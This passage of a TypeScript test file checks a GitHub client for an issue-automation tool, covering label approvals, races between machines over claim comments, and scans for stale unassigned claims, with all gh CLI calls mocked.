                nodes: [readyOn("2026-10-04T11:36:21Z", "rawphp")],
              },
              lastEditedAt: null,
              editor: null,
              userContentEdits: editsJson([["2026-10-04T09:50:06Z", "outsider"]], 1),
            },
          },
        },
      });
      const t = setup(reply(answer));
      const found = yield* t.ok(t.github.approval(10, ["rawphp"]));
      assert.deepStrictEqual(found, approved("2026-10-04T11:36:21Z", "rawphp"));
      const calls = t.calls();
      assert.strictEqual(calls.length, 1);
      assert.deepStrictEqual(calls[0]!.slice(0, 2), ["api", "graphql"]);
      assert.include(calls[0]!, "number=10");
    }),
);

/** A recorded answer of the approval query: the label at 10:00 and an outsider's rename at 10:30. */
const RENAMED_BY_OUTSIDER =
  '{"data":{"repository":{"issue":{"timelineItems":{"totalCount":2,"nodes":[{"__typename":"LabeledEvent","createdAt":"2026-10-04T10:00:00Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T10:30:00Z","actor":{"__typename":"User","login":"outsider"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outsider"}}]}}}}}';

it.effect("text check sends one graphql call per check and uses the instructors it is given", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(RENAMED_BY_OUTSIDER),
      reply(RENAMED_BY_OUTSIDER),
      reply(RENAMED_BY_OUTSIDER),
    );
    // The rename is at or after the first moment and before the second.
    assert.strictEqual(
      yield* t.ok(t.github.textCheck(10, "2026-10-04T10:00:00Z", ["rawphp"])),
      "changed",
    );
    assert.strictEqual(
      yield* t.ok(t.github.textCheck(10, "2026-10-04T10:30:01Z", ["rawphp"])),
      "unchanged",
    );
    // The list passed is the one used: with the outsider as an instructor it is unchanged.
    assert.strictEqual(
      yield* t.ok(t.github.textCheck(10, "2026-10-04T10:00:00Z", ["outsider"])),
      "unchanged",
    );
    const calls = t.calls();
    assert.strictEqual(calls.length, 3);
    for (const call of calls) {
      assert.strictEqual(call.length, 10);
      assert.deepStrictEqual(call.slice(0, 3), ["api", "graphql", "-f"]);
      assert.isTrue(call[3]!.startsWith("query=query($owner: String!, $name: String!"));
      assert.include(call[3]!, "RENAMED_TITLE_EVENT");
      assert.deepStrictEqual(call.slice(4), [
        "-f",
        "owner=rawphp",
        "-f",
        "name=softfac",
        "-F",
        "number=10",
      ]);
    }
  }),
);

const BEFORE = "2026-10-08T02:00:00Z";

const historyCallFor = (issue: number) => [
  "api",
  "graphql",
  "-f",
  `query=${APPROVAL_QUERY}`,
  "-f",
  "owner=rawphp",
  "-f",
  "name=softfac",
  "-F",
  `number=${issue}`,
];

const claimedListCall = (label: string) => [
  "issue",
  "list",
  "--repo",
  REPO,
  "--state",
  "open",
  "--label",
  label,
  "--limit",
  "200",
  "--json",
  "number,assignees,updatedAt",
];

/** A history whose newest event of `label` was added by `by`. */
const labelledBy = (by: string, label: string) =>
  eventsReply([labelEvent("LabeledEvent", LABELED, by, label)], null, []);

const scan = (
  t: ReturnType<typeof setup>,
  known: ReadonlySet<number> = new Set<number>(),
  memo: ClaimMemo = new ClaimMemo(),
) => t.github.unassignedClaims(BEFORE, "rawphp", known, memo);

it.effect("login asks the api who is logged in with the exact call", () =>
  Effect.gen(function* () {
    const t = setup(reply('{"login":"Rawphp","id":1,"type":"User"}'));
    assert.strictEqual(yield* t.ok(t.github.login()), "Rawphp");
    assert.deepStrictEqual(t.calls(), [["api", "user"]]);
  }),
);

it.effect("login refuses an answer without a login", () =>
  Effect.gen(function* () {
    const t = setup(reply('{"login":"","id":1}'));
    const error = yield* t.err(t.github.login());
    assert.strictEqual(error._tag, "GitHubParse");
    const t2 = setup(reply('{"id":1}'));
    assert.strictEqual((yield* t2.err(t2.github.login()))._tag, "GitHubParse");
  }),
);

/** The claimer the claim tests post as: this machine, on the label that began the claim. */
const CLAIMER = {
  machine: "mac-mini",
  since: "2026-10-04T10:00:00Z",
  trusted: ["rawphp", "tomkaczocha"],
} as const;
/** When this machine's claim comment was created. */
const CLAIMED_AT = "2026-10-04T10:05:00Z";
const claimBody = (machine: string) =>
  `Claimed by machine ${machine}.\n\n<!-- softfac:claim ${machine} -->`;
const claimPostCall = (machine = "mac-mini") => [
  "api",
  "-X",
  "POST",
  `repos/${REPO}/issues/6/comments`,
  "-f",
  `body=${claimBody(machine)}`,
];
const claimPosted = (id: number, at = CLAIMED_AT) =>
  reply(`{"id":${id},"created_at":"${at}","body":"x","user":{"login":"rawphp"}}`);
const claimRow = (
  id: number,
  machine: string,
  at: string,
  login = "rawphp",
  association = "COLLABORATOR",
) => ({
  id,
  user: { login },
  created_at: at,
  body: claimBody(machine),
  author_association: association,
});
const claimList = (...rows: ReadonlyArray<Record<string, unknown>>) => reply(JSON.stringify(rows));
const claimListCall = ["api", `repos/${REPO}/issues/6/comments`, "--paginate"];
const claimEditCall = editCall(
  "--add-assignee",
  "rawphp",
  "--remove-label",
  "factory:ready",
  "--add-label",
  "factory:triage",
);
const claimViewCall = ["issue", "view", "6", "--repo", REPO, "--json", "assignees"];
const claim6 = (t: ReturnType<typeof setup>) =>
  t.github.claim(6, "rawphp", "ready", "triage", CLAIMER);

it.effect("claim views the assignees, then assigns and swaps the labels in one edit", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(50, "mac-mini", CLAIMED_AT)),
      reply(""),
    );
    const outcome = yield* t.ok(claim6(t));
    assert.deepStrictEqual(outcome, { kind: "claimed" });
    assert.deepStrictEqual(t.calls(), [
      claimViewCall,
      claimPostCall(),
      claimListCall,
      claimEditCall,
    ]);
  }),
);

it.effect("claim leaves an issue that already has any assignee alone", () =>
  Effect.gen(function* () {
    const t = setup(reply('{"assignees":[{"login":"a"},{"login":"b"}]}'));
    const outcome = yield* t.ok(claim6(t));
    assert.deepStrictEqual(outcome, { kind: "skipped-assigned", assignees: ["a", "b"] });
    // No claim comment is posted for an issue someone has.
    assert.strictEqual(t.calls().length, 1);
  }),
);

it.effect("claim passes on a failing edit", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(50, "mac-mini", CLAIMED_AT)),
      fail(1, "boom"),
    );
    const error = yield* t.err(claim6(t));
    assert.strictEqual(error._tag, "GitHubFailed");
  }),
);

it.effect(
  "claim backs off from an earlier claim comment of another machine: its own is deleted, nothing is edited",
  () =>
    Effect.gen(function* () {
      const t = setup(
        reply('{"assignees":[]}'),
        claimPosted(50),
        claimList(
          claimRow(49, "trilogy-mac", "2026-10-04T10:04:59Z", "tomkaczocha"),
          claimRow(50, "mac-mini", CLAIMED_AT),
        ),
        reply(""),
      );
      const outcome = yield* t.ok(claim6(t));
      assert.deepStrictEqual(outcome, { kind: "claimed-elsewhere", machine: "trilogy-mac" });
      assert.deepStrictEqual(t.calls(), [
        claimViewCall,
        claimPostCall(),
        claimListCall,
        ["api", "-X", "DELETE", `repos/${REPO}/issues/comments/50`],
      ]);
    }),
);

it.effect("claim still backs off when its own comment cannot be deleted", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(49, "trilogy-mac", "2026-10-04T10:04:59Z")),
      fail(1, "HTTP 403"),
    );
    const outcome = yield* t.ok(claim6(t));
    assert.deepStrictEqual(outcome, { kind: "claimed-elsewhere", machine: "trilogy-mac" });
    assert.notDeepInclude(t.calls(), claimEditCall);
  }),
);

/** A claimer whose ready label is old enough that only the 10-minute rule drops a comment. */
const EARLY = { ...CLAIMER, since: "2026-10-04T09:00:00Z" } as const;

it.effect("claim ignores a claim comment more than 10 minutes older than its own", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(40, "trilogy-mac", "2026-10-04T09:54:59Z"),
        claimRow(50, "mac-mini", CLAIMED_AT),
      ),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.claim(6, "rawphp", "ready", "triage", EARLY)), {
      kind: "claimed",
    });
    assert.deepStrictEqual(t.calls().at(-1), claimEditCall);
  }),
);

it.effect("claim still loses to a claim comment exactly 10 minutes older than its own", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(40, "trilogy-mac", "2026-10-04T09:55:00Z")),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.claim(6, "rawphp", "ready", "triage", EARLY)), {
      kind: "claimed-elsewhere",
      machine: "trilogy-mac",
    });
  }),
);

it.effect("claim is not blocked by a comment that itself lost to an abandoned one", () =>
  Effect.gen(function* () {
    // trilogy-mac won at 09:54 and never edited; old-mac lost to it and could not delete its comment.
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(40, "trilogy-mac", "2026-10-04T09:54:00Z"),
        claimRow(45, "old-mac", "2026-10-04T09:58:00Z"),
      ),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.claim(6, "rawphp", "ready", "triage", EARLY)), {
      kind: "claimed",
    });
    assert.deepStrictEqual(t.calls().at(-1), claimEditCall);
  }),
);

it.effect("claim counts an earlier claim comment of its own machine as its win", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(49, "Mac-Mini", "2026-10-04T10:04:00Z"),
        claimRow(50, "mac-mini", CLAIMED_AT),
      ),
      reply(""),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(claim6(t)), { kind: "claimed" });
    // The new comment is a duplicate: it goes, the earlier one stays as the record.
    assert.deepStrictEqual(t.calls().slice(3), [
      ["api", "-X", "DELETE", `repos/${REPO}/issues/comments/50`],
      claimEditCall,
    ]);
  }),
);

it.effect("claim gives way when its own leftover comment holding the claim is 6 minutes old", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(49, "mac-mini", "2026-10-04T09:59:00Z"),
        claimRow(50, "mac-mini", CLAIMED_AT),
      ),
      reply(""),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(t.github.claim(6, "rawphp", "ready", "triage", EARLY)), {
      kind: "gave-way",
    });
    // Both go, the new duplicate and the leftover, and nothing is edited.
    assert.deepStrictEqual(t.calls().slice(3), [
      ["api", "-X", "DELETE", `repos/${REPO}/issues/comments/50`],
      ["api", "-X", "DELETE", `repos/${REPO}/issues/comments/49`],
    ]);
  }),
);

it.effect("claim gives up before the edit once its comment is 5 minutes old, deleting it", () =>
  Effect.gen(function* () {
    // The comment listing takes 6 minutes to answer.
    const slowList: Answer = {
      kind: "result",
      result: { exitCode: 0, tail: JSON.stringify([claimRow(50, "mac-mini", CLAIMED_AT)]) },
      delay: "6 minutes",
    };
    const t = setup(reply('{"assignees":[]}'), claimPosted(50), slowList, reply(""));
    const fiber = yield* Effect.forkChild(t.ok(claim6(t)), { startImmediately: true });
    yield* TestClock.adjust("6 minutes");
    assert.deepStrictEqual(yield* Fiber.join(fiber), { kind: "gave-way" });
    assert.deepStrictEqual(t.calls(), [
      claimViewCall,
      claimPostCall(),
      claimListCall,
      ["api", "-X", "DELETE", `repos/${REPO}/issues/comments/50`],
    ]);
  }),
);

it.effect("claim ignores a claim comment from before the newest factory:ready label", () =>
  Effect.gen(function* () {
    const t = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(40, "trilogy-mac", "2026-10-04T09:59:59Z"),
        claimRow(50, "mac-mini", CLAIMED_AT),
      ),
      reply(""),
    );
    assert.deepStrictEqual(yield* t.ok(claim6(t)), { kind: "claimed" });
    assert.deepStrictEqual(t.calls().at(-1), claimEditCall);
  }),
);

it.effect("claim between two machines on one login: the comment decides, not the login", () =>
  Effect.gen(function* () {
    // Both claim comments are by `rawphp`; the earlier one names another machine.
    const lost = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(49, "trilogy-mac", CLAIMED_AT), claimRow(50, "mac-mini", CLAIMED_AT)),
      reply(""),
    );
    assert.deepStrictEqual(yield* lost.ok(claim6(lost)), {
      kind: "claimed-elsewhere",
      machine: "trilogy-mac",
    });
    // The machine whose comment is earliest takes it, whichever order it reads in.
    const won = setup(
      reply('{"assignees":[]}'),
      claimPosted(49),
      claimList(claimRow(49, "mac-mini", CLAIMED_AT), claimRow(50, "trilogy-mac", CLAIMED_AT)),
      reply(""),
    );
    assert.deepStrictEqual(yield* won.ok(claim6(won)), { kind: "claimed" });
    assert.deepStrictEqual(won.calls().at(-1), claimEditCall);
  }),
);

it.effect("claim counts only the claim comments of logins that can work the repo", () =>
  Effect.gen(function* () {
    // An outsider's earlier claim comment holds nothing.
    const outsider = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(
        claimRow(49, "evil", "2026-10-04T10:04:59Z", "mallory", "NONE"),
        claimRow(50, "mac-mini", CLAIMED_AT),
      ),
      reply(""),
    );
    assert.deepStrictEqual(yield* outsider.ok(claim6(outsider)), { kind: "claimed" });
    assert.deepStrictEqual(outsider.calls().at(-1), claimEditCall);
    // An instructor GitHub shows as a contributor (a hidden org membership) still counts.
    const instructor = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(49, "trilogy-mac", "2026-10-04T10:04:59Z", "tomkaczocha", "CONTRIBUTOR")),
      reply(""),
    );
    // Logins match ignoring ASCII case, on both sides.
    const mixed = { ...CLAIMER, trusted: ["rawphp", "TomKaczocha"] };
    assert.deepStrictEqual(
      yield* instructor.ok(instructor.github.claim(6, "rawphp", "ready", "triage", mixed)),
      {
        kind: "claimed-elsewhere",
        machine: "trilogy-mac",
      },
    );
    // A member's counts whatever the login.
    const member = setup(
      reply('{"assignees":[]}'),
      claimPosted(50),
      claimList(claimRow(49, "trilogy-mac", "2026-10-04T10:04:59Z", "someone", "MEMBER")),
      reply(""),
    );
    assert.deepStrictEqual(yield* member.ok(claim6(member)), {
      kind: "claimed-elsewhere",
      machine: "trilogy-mac",
    });
    // claimWinner reads with the same rule.
    const winner = setup(
      reply(labelledBy("tomkaczocha", "factory:ready")),
      claimList(
        claimRow(40, "trilogy-mac", AFTER),
        claimRow(60, "evil", LATER, "mallory", "FIRST_TIME_CONTRIBUTOR"),
      ),
    );
    assert.deepStrictEqual(yield* winner.ok(winner.github.claimWinner(6, CLAIMER.trusted)), {
      id: 40,
      machine: "trilogy-mac",
      createdAt: AFTER,
    });
  }),
);

it.effect(
  "claimWinner names the claim holding the issue since the newest ready label, at any age",
  () =>
    Effect.gen(function* () {
      const t = setup(
        reply(labelledBy("tomkaczocha", "factory:ready")),
        claimList(
          claimRow(30, "old-mac", "2026-10-04T09:00:00Z"),
          { id: 31, user: { login: "tom" }, created_at: AFTER, body: "not a claim" },
          claimRow(40, "trilogy-mac", AFTER),
          claimRow(41, "mac-mini", AFTER),
        ),
      );
      assert.deepStrictEqual(yield* t.ok(t.github.claimWinner(6, CLAIMER.trusted)), {
        id: 40,
        machine: "trilogy-mac",
        createdAt: AFTER,
      });
      assert.deepStrictEqual(t.calls(), [historyCallFor(6), claimListCall]);
      const none = setup(reply(labelledBy("tomkaczocha", "factory:ready")), claimList());
      assert.strictEqual(yield* none.ok(none.github.claimWinner(6, CLAIMER.trusted)), null);
      // A winner that never made its edit gives way to the claim made 10 minutes on, as `claim` decided.
      const past = setup(
        reply(labelledBy("tomkaczocha", "factory:ready")),
        claimList(claimRow(40, "trilogy-mac", AFTER), claimRow(60, "mac-mini", LATER)),
      );
      assert.deepStrictEqual(yield* past.ok(past.github.claimWinner(6, CLAIMER.trusted)), {
        id: 60,
        machine: "mac-mini",
        createdAt: LATER,
      });
    }),
);

it.effect("a claim comment by an instructor is never read as feedback", () =>
  Effect.gen(function* () {
    const t = setup(
      reply(
        JSON.stringify([
          {
            id: 7,
            node_id: "IC_7",
            user: { login: "tom" },
            created_at: LATER,
            updated_at: LATER,
            body: claimBody("trilogy-mac"),
          },
        ]),
      ),
      reply(activityBodyReply("b", null)),
    );
    const activity = yield* t.ok(t.github.activitySince(6, AFTER, ["tom"]));
    assert.deepStrictEqual(activity.comments, []);
  }),
);

it.effect("unassignedClaims lists triage then building with the exact calls", () =>
  Effect.gen(function* () {
    const t = setup(reply("[]"), reply("[]"));
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, []);
    assert.deepStrictEqual(t.calls(), [
      claimedListCall("factory:triage"),
      claimedListCall("factory:building"),
    ]);
  }),
);

it.effect("unassignedClaims keeps only unassigned issues that are old enough, by number", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":9,"assignees":[],"updatedAt":"2026-10-08T01:00:00Z"},
      {"number":6,"assignees":[],"updatedAt":"2026-10-08T01:59:59Z"},
      {"number":7,"assignees":[{"login":"a"}],"updatedAt":"2026-10-01T00:00:00Z"},
      {"number":8,"assignees":[],"updatedAt":"2026-10-08T03:00:00Z"},
      {"number":10,"assignees":[],"updatedAt":"2026-10-08T02:00:00Z"}
    ]`;
    const building = `[
      {"number":4,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":3,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(
      reply(triage),
      reply(labelledBy("rawphp", "factory:triage")),
      reply(labelledBy("rawphp", "factory:triage")),
      reply(building),
      reply(labelledBy("rawphp", "factory:building")),
      reply(labelledBy("rawphp", "factory:building")),
    );
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, [
      { issue: 6, state: "triage" },
      { issue: 9, state: "triage" },
      { issue: 3, state: "building" },
      { issue: 4, state: "building" },
    ]);
    // The history is read only for an issue that has no assignee and is old enough.
    assert.deepStrictEqual(t.calls(), [
      claimedListCall("factory:triage"),
      historyCallFor(6),
      historyCallFor(9),
      claimedListCall("factory:building"),
      historyCallFor(3),
      historyCallFor(4),
    ]);
  }),
);

it.effect("unassignedClaims drops an issue whose label someone else added", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(
      reply(triage),
      reply(labelledBy("another-machine", "factory:triage")),
      reply(labelledBy("RawPhp", "factory:triage")),
      reply("[]"),
    );
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, [{ issue: 2, state: "triage" }]);
  }),
);

it.effect("unassignedClaims judges the newest event of the label in its state", () =>
  Effect.gen(function* () {
    const on = (at: string, by: string, label: string) => labelEvent("LabeledEvent", at, by, label);
    const building = '[{"number":5,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}]';
    // We labelled it first and a person labelled it again: not ours.
    const thenAPerson = eventsReply(
      [on(LABELED, "rawphp", "factory:building"), on(AFTER, "eve", "factory:building")],
      null,
      [],
    );
    const t = setup(reply("[]"), reply(building), reply(thenAPerson));
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, []);
    // Labels of other names after ours do not count.
    const thenAnotherLabel = eventsReply(
      [on(LABELED, "rawphp", "factory:building"), on(AFTER, "eve", "bug")],
      null,
      [],
    );
    const t2 = setup(reply("[]"), reply(building), reply(thenAnotherLabel));
    assert.deepStrictEqual((yield* t2.ok(scan(t2))).claims, [{ issue: 5, state: "building" }]);
  }),
);

it.effect("unassignedClaims drops an issue with no label event in its history", () =>
  Effect.gen(function* () {
    const triage = '[{"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}]';
    const t = setup(reply(triage), reply(eventsReply([], null, [])), reply("[]"));
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, []);
  }),
);

it.effect("unassignedClaims reads no history for an issue the pass knows a run for", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(reply(triage), reply(labelledBy("rawphp", "factory:triage")), reply("[]"));
    const found = yield* t.ok(scan(t, new Set([1])));
    assert.deepStrictEqual(found.claims, [{ issue: 2, state: "triage" }]);
    assert.deepStrictEqual(t.calls(), [
      claimedListCall("factory:triage"),
      historyCallFor(2),
      claimedListCall("factory:building"),
    ]);
  }),
);

it.effect(
  "unassignedClaims remembers an issue judged not the factory's while updatedAt is unchanged",
  () =>
    Effect.gen(function* () {
      const listing = (updatedAt1: string) => `[
        {"number":1,"assignees":[],"updatedAt":"${updatedAt1}"},
        {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
      ]`;
      const other = labelledBy("another-machine", "factory:triage");
      const ours = labelledBy("rawphp", "factory:triage");
      const memo = new ClaimMemo();
      const histories = (t: ReturnType<typeof setup>) =>
        t.calls().filter((args) => args[0] === "api" && args[1] === "graphql");
      const t1 = setup(
        reply(listing("2026-10-07T00:00:00Z")),
        reply(other),
        reply(ours),
        reply("[]"),
      );
      yield* t1.ok(scan(t1, new Set<number>(), memo));
      assert.deepStrictEqual(histories(t1), [historyCallFor(1), historyCallFor(2)]);
      // Issue 1 was not ours and has not changed; issue 2 was ours, so it is read again.
      const t2 = setup(reply(listing("2026-10-07T00:00:00Z")), reply(ours), reply("[]"));
      const second = yield* t2.ok(scan(t2, new Set<number>(), memo));
      assert.deepStrictEqual(histories(t2), [historyCallFor(2)]);
      assert.deepStrictEqual(second.claims, [{ issue: 2, state: "triage" }]);
      // Issue 1 changed, so its judgement no longer stands.
      const t3 = setup(
        reply(listing("2026-10-07T01:00:00Z")),
        reply(other),
        reply(ours),
        reply("[]"),
      );
      yield* t3.ok(scan(t3, new Set<number>(), memo));
      assert.deepStrictEqual(histories(t3), [historyCallFor(1), historyCallFor(2)]);
    }),
);

it.effect(
  "unassignedClaims judges again for another login, even while updatedAt is unchanged",
  () =>
    Effect.gen(function* () {
      const triage = '[{"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}]';
      const byOther = labelledBy("another-machine", "factory:triage");
      const memo = new ClaimMemo();
      const t1 = setup(reply(triage), reply(byOther), reply("[]"));
      assert.deepStrictEqual((yield* t1.ok(scan(t1, new Set<number>(), memo))).claims, []);
      // gh is now logged in as the machine that added the label: issue 1 is its claim.
      const t2 = setup(reply(triage), reply(byOther), reply("[]"));
      const found = yield* t2.ok(
        t2.github.unassignedClaims(BEFORE, "Another-Machine", new Set<number>(), memo),
      );
      assert.deepStrictEqual(found.claims, [{ issue: 1, state: "triage" }]);
      assert.deepStrictEqual(t2.calls()[1], historyCallFor(1));
    }),
);

it.effect("unassignedClaims keeps one repo's judgement off the same number in another repo", () =>
  Effect.gen(function* () {
    const triage = '[{"number":9,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}]';
    const memo = new ClaimMemo();
    const t1 = setup(reply(triage), reply(labelledBy("eve", "factory:triage")), reply("[]"));
    assert.deepStrictEqual((yield* t1.ok(scan(t1, new Set<number>(), memo))).claims, []);
    const t2 = setup(reply(triage), reply(labelledBy("rawphp", "factory:triage")), reply("[]"));
    const other = makeGitHub({ repo: "rawphp/other", ghConfigDir: GH_CONFIG_DIR });
    const found = yield* t2.ok(other.unassignedClaims(BEFORE, "rawphp", new Set<number>(), memo));
    assert.deepStrictEqual(found.claims, [{ issue: 9, state: "triage" }]);
    assert.deepStrictEqual(
      t2.calls()[1],
      historyCallFor(9).map((arg) => (arg === "name=softfac" ? "name=other" : arg)),
    );
  }),
);

it.effect("unassignedClaims keeps one label's judgement off the issue's other label", () =>
  Effect.gen(function* () {
    const on = (at: string, by: string, label: string) => labelEvent("LabeledEvent", at, by, label);
    const listed = '[{"number":5,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}]';
    // A person added triage, the factory added building.
    const history = eventsReply(
      [on(LABELED, "eve", "factory:triage"), on(AFTER, "rawphp", "factory:building")],
      null,
      [],
    );
    const t = setup(reply(listed), reply(history), reply(listed), reply(history));
    const found = yield* t.ok(scan(t));
    assert.deepStrictEqual(found.claims, [{ issue: 5, state: "building" }]);
    assert.deepStrictEqual(t.calls(), [
      claimedListCall("factory:triage"),
      historyCallFor(5),
      claimedListCall("factory:building"),
      historyCallFor(5),
    ]);
  }),
);

it.effect("unassignedClaims: a history read that fails is an error for that issue only", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(
      reply(triage),
      fail(1, "boom"),
      reply(labelledBy("rawphp", "factory:triage")),
      reply("[]"),
    );
    const memo = new ClaimMemo();
    const found = yield* t.ok(scan(t, new Set<number>(), memo));
    assert.deepStrictEqual(found.claims, [{ issue: 2, state: "triage" }]);
    assert.strictEqual(found.unread.length, 1);
    const unread = found.unread[0]!;
    assert.strictEqual(unread.issue, 1);
    assert.strictEqual(unread.error._tag, "GitHubFailed");
    assert.deepStrictEqual(
      unread.error._tag === "GitHubFailed" ? unread.error.args : [],
      historyCallFor(1),
    );
    assert.deepStrictEqual(t.calls(), [
      claimedListCall("factory:triage"),
      historyCallFor(1),
      historyCallFor(2),
      claimedListCall("factory:building"),
    ]);
    // An issue that could not be read is not judged, so the next scan reads it again.
    const again = setup(
      reply(triage),
      reply(labelledBy("rawphp", "factory:triage")),
      reply(labelledBy("rawphp", "factory:triage")),
      reply("[]"),
    );
    const next = yield* again.ok(scan(again, new Set<number>(), memo));
    assert.deepStrictEqual(next.claims, [
      { issue: 1, state: "triage" },
      { issue: 2, state: "triage" },
    ]);
    assert.deepStrictEqual(again.calls()[1], historyCallFor(1));
  }),
);

it.effect(
  "unassignedClaims: an unparseable history is that issue's error and the next is still read",
  () =>
    Effect.gen(function* () {
      const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
      const t = setup(
        reply(triage),
        reply("not json"),
        reply(labelledBy("rawphp", "factory:triage")),
        reply("[]"),
      );
      const found = yield* t.ok(scan(t));
      assert.deepStrictEqual(found.claims, [{ issue: 2, state: "triage" }]);
      assert.strictEqual(found.unread.length, 1);
      assert.strictEqual(found.unread[0]!.issue, 1);
      assert.strictEqual(found.unread[0]!.error._tag, "GitHubParse");
      assert.deepStrictEqual(t.calls(), [
        claimedListCall("factory:triage"),
        historyCallFor(1),
        historyCallFor(2),
        claimedListCall("factory:building"),
      ]);
    }),
);

it.effect("unassignedClaims: an oversized history is that issue's error and the next is read", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(
      reply(triage),
      truncated(),
      reply(labelledBy("rawphp", "factory:triage")),
      reply("[]"),
    );
    const found = yield* t.ok(scan(t));
    assert.deepStrictEqual(found.claims, [{ issue: 2, state: "triage" }]);
    assert.deepStrictEqual(
      found.unread.map((u) => [u.issue, u.error._tag]),
      [[1, "GitHubOutputTooLarge"]],
    );
    assert.deepStrictEqual(t.calls()[2], historyCallFor(2));
  }),
);

it.effect("unassignedClaims ends the scan when gh cannot start, with no further call", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(reply(triage), spawnError());
    const error = yield* t.err(scan(t));
    assert.strictEqual(error._tag, "GitHubSpawnError");
    assert.deepStrictEqual(t.calls(), [claimedListCall("factory:triage"), historyCallFor(1)]);
  }),
);

it.effect(
  "unassignedClaims ends the scan on a rate-limited history read, with no further call",
  () =>
    Effect.gen(function* () {
      const triage = `[
        {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
        {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
      ]`;
      const t = setup(reply(triage), fail(1, "GraphQL: API rate limit already exceeded"));
      const error = yield* t.err(scan(t));
      assert.strictEqual(error._tag, "GitHubRateLimited");
      assert.deepStrictEqual(t.calls(), [claimedListCall("factory:triage"), historyCallFor(1)]);
    }),
);

it.effect("unassignedClaims ends the scan on a timed-out history read, with no further call", () =>
  Effect.gen(function* () {
    const triage = `[
        {"number":1,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"},
        {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
      ]`;
    const t = setup(reply(triage), timedOut());
    const error = yield* t.err(scan(t));
    assert.strictEqual(error._tag, "GitHubTimedOut");
    assert.deepStrictEqual(t.calls(), [claimedListCall("factory:triage"), historyCallFor(1)]);
  }),
);

it.effect("unassignedClaims skips an issue whose time is not GitHub's form", () =>
  Effect.gen(function* () {
    const triage = `[
      {"number":1,"assignees":[],"updatedAt":"yesterday"},
      {"number":2,"assignees":[],"updatedAt":"2026-10-07T00:00:00Z"}
    ]`;
    const t = setup(reply(triage), reply(labelledBy("rawphp", "factory:triage")), reply("[]"));
    assert.deepStrictEqual((yield* t.ok(scan(t))).claims, [{ issue: 2, state: "triage" }]);
    assert.deepStrictEqual(t.calls()[1], historyCallFor(2));
  }),
);

it.effect("unassignedClaims refuses a before that is not GitHub's form, with no call", () =>
  Effect.gen(function* () {
    const t = setup();
    const error = yield* t.err(
      t.github.unassignedClaims(
        "2026-10-08T02:00:00.000Z",
        "rawphp",
        new Set<number>(),
        new ClaimMemo(),
      ),
    );
    assert.strictEqual(error._tag, "GitHubParse");
